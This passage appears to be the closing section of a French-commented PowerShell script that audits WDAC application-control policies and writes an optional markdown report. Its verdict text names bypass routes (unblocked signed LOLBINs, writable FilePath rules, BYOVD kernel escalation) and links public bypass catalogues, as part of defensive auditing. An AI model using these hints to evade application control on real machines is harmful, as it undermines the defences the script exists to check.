W "  VERDICT GLOBAL" "Yellow"
if ($auditBases.Count -gt 0 -and $enforcedBases.Count -eq 0) {
    W "    Aucune base enforcee -> WDAC ne bloque RIEN sur cette machine." "Red"
} elseif ($enforcedBases.Count -gt 0) {
    W ("    {0} base(s) enforcee(s). Bypass sans admin via LOLBINs signes non bloques" -f $enforcedBases.Count) "White"
    W "    et/ou FilePath writable ; escalade kernel via BYOVD (admin requis)." "White"
    if ($auditBases.Count -gt 0) {
        W ("    ATTENTION: {0} base(s) en AUDIT presentes -> potentiellement non applique." -f $auditBases.Count) "Red"
    }
}
W ""
W "  References: LOLBAS https://lolbas-project.github.io/ | LOLDrivers https://www.loldrivers.io/" "Magenta"
W "              bohops https://github.com/bohops/UltimateWDACBypassList" "Magenta"
W ""

# ============================================================================
#  RAPPORT MARKDOWN OPTIONNEL
# ============================================================================
if ($Report) {
    $header = @(
        "# WDAC / App Control - Rapport d'audit",
        "",
        ("Genere le {0} - {1} fichier(s)." -f (Get-Date -Format "yyyy-MM-dd HH:mm"), $xmlFiles.Count),
        "",
        "Sources: [LOLBAS](https://lolbas-project.github.io/), [LOLDrivers](https://www.loldrivers.io/), [bohops UltimateWDACBypassList](https://github.com/bohops/UltimateWDACBypassList).",
        "",
        ('`' + '``text')
    )
    $footer = @('`' + '``')
    # Collapse les blocs de lignes vides consecutives pour un rapport lisible
    $clean = New-Object System.Collections.Generic.List[string]
    $prevBlank = $false
    foreach ($ln in $script:MD) {
        $isBlank = [string]::IsNullOrWhiteSpace($ln)
        if ($isBlank -and $prevBlank) { continue }
        $clean.Add($ln)
        $prevBlank = $isBlank
    }
    ($header + $clean + $footer) | Set-Content -Path $Report -Encoding UTF8
    Write-Host ("  [Rapport ecrit] {0}" -f (Resolve-Path $Report)) -ForegroundColor Cyan
}
